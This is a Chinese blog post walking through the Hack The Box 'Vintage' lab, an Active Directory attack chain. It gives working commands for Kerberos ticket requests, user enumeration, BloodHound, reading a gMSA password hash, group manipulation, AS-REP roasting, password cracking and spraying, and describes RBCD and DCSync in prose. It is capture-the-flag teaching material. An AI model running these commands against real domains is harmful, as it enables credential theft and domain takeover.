
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/F12-blog/p/18814904" title="发布于 2025-04-08 16:15">
    <span role="heading" aria-level="2">HTB打靶记录-Vintage</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="信息收集">信息收集</h1>
<p><code>nmap -sV -sC -O 10.10.11.45</code></p>
<pre><code>Nmap scan report for 10.10.11.45
Host is up (2.1s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec?
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn?
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port139-TCP:V=7.95%I=7%D=4/7%Time=67F39479%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,5,"\x83\0\0\x01\x8f");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-07T08:43:58
|_  start_date: N/A
|_clock-skew: -19m07s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 370.27 seconds
</code></pre>
<p>题目描述给了一个凭证：<code>P.Rosa:Rosaisbest123</code></p>
<h1 id="gettgt">GetTGT</h1>
<p><code>impacket-getTGT 'vintage.htb/P.Rosa:Rosaisbest123' -dc-ip 10.10.11.45</code><br>
记得要faketime<br>
<code>export KRB5CCNAME=P.Rosa.ccache</code></p>
<h1 id="ldap收集信息">ldap收集信息</h1>
<p>smb走不通，通过ldap来收集，<code>nxc ldap 10.10.11.45 -d vintage.htb -k --use-kcache --users</code></p>
<pre><code>Administrator
Guest
krbtgt
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm
</code></pre>
<p>ldap收集不全。改用smb<br>
<code>nxc smb 10.10.11.45 -d vintage.htb -u P.Rosa -k --use-kcache --rid-brute | grep "SidTypeUser"</code></p>
<pre><code>Administrator
Guest
krbtgt
DC01$
gMSA01$
FS01$
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm
</code></pre>
<p>常规手法都测试了，一点信息收集不到了，直接bloodhound看有没有突破口</p>
<h1 id="bloodhound">bloodhound</h1>
<p><code>faketime "$(ntpdate -q 10.10.11.45 | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" bloodhound-python -d vintage.htb -u P.Rosa -k -no-pass -ns 10.10.11.45 -c all --zip</code><br>
FS01属于PRE-WINDOWS 2000 Compatible Access组，可以pre2k打一下试试<br>
<img src="https://raw.githubusercontent.com/F12-F12/markdown/main/20250408135912.png" alt="20250408135912" loading="lazy"></p>
<h1 id="pre2k">pre2k</h1>
<p><code>pre2k unauth -d vintage.htb -dc-ip 10.10.11.45 -save -inputfile user.txt</code><br>
<img src="https://raw.githubusercontent.com/F12-F12/markdown/main/20250408142821.png" alt="20250408142821" loading="lazy"><br>
继续查看FS01的域关系网，可以从msDS-ManagedPassword读取GMSA01的密码hash<br>
<img src="https://raw.githubusercontent.com/F12-F12/markdown/main/20250408143003.png" alt="20250408143003" loading="lazy"></p>
<h1 id="gmsa">GMSA</h1>
<p><code>bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k get object 'GMSA01$' --attr msDS-ManagedPassword</code><br>
<img src="https://raw.githubusercontent.com/F12-F12/markdown/main/20250408144149.png" alt="20250408144149" loading="lazy"><br>
获取TGT，<code>impacket-getTGT vintage.htb/'gmsa01$' -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178  -dc-ip 10.10.11.45</code><br>
查看gmsa01的域关系网，可以将gmsa01加入SERVICEMANAGES组<br>
<img src="https://raw.githubusercontent.com/F12-F12/markdown/main/20250408144759.png" alt="20250408144759" loading="lazy"></p>
<h1 id="addselfgerenicwrite">AddSelf/GerenicWrite</h1>
<p><code>bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --kerberos --dc-ip 10.10.11.45 -u 'GMSA01$' -k  add groupMember "CN=SERVICEMANAGERS,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB"  'GMSA01$'</code><br>
查看是否添加成功<br>
<code>bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --kerberos --dc-ip 10.10.11.45 -u 'GMSA01$' -k  get object "CN=SERVICEMANAGERS,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB" --attr member</code><br>
<img src="https://raw.githubusercontent.com/F12-F12/markdown/main/20250408145924.png" alt="20250408145924" loading="lazy"><br>
查看SERVICEMANAGES组的域关系网<br>
<img src="https://raw.githubusercontent.com/F12-F12/markdown/main/20250408155327.png" alt="20250408155327" loading="lazy"><br>
对这三个用户有GerenicAll权限，将这三个用户的预认证关闭，打一个AS-REQ Roasting<br>
<code>bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH</code><br>
svc_sql用户未启用，启用一下，删除UAC里的ACCOUNTDISABLE就行了<br>
<code>bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac svc_sql -f ACCOUNTDISABLE</code><br>
打AS-REQ Roasting<br>
<code>impacket-GetNPUsers vintage/ -request -format hashcat -usersfile user.txt -outputfile np.txt -dc-ip 10.10.11.45 -dc-host dc01.vintage.htb</code><br>
爆破svc_sql的密码<br>
<code>john np.txt -w=/usr/share/wordlists/rockyou.txt</code><br>
拿到密码：???????<br>
用这个密码喷洒一下其他用户<br>
<code>kerbrute passwordspray -d vintage.htb user.txt &lt;password&gt;</code><br>
打中C.Neri，这里应该winrm能够连上C.Neri，但我这里死活连不上，就说一下后面的攻击思路，C.Neri也属于SERVICEMANAGES组，所以可以通过svc_sql打一个RBCD，我们要挑选高权限的用户来伪造，发现L.Bianchi_adm对域控有DCSync权限，那么就可以通过RBCD来获取L.Bianchi_adm的TGT，然后打域控的DCSync获取域管理员的NTLM Hash<br>
<img src="https://raw.githubusercontent.com/F12-F12/markdown/main/20250408161039.png" alt="20250408161039" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.03602037095138889" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-04-08 16:15">2025-04-08 16:15</span>&nbsp;
<a href="https://www.cnblogs.com/F12-blog">F12~</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18814904" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18814904);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18814904', targetLink: 'https://www.cnblogs.com/F12-blog/p/18814904', title: 'HTB打靶记录-Vintage' })">举报</a>
</div>
        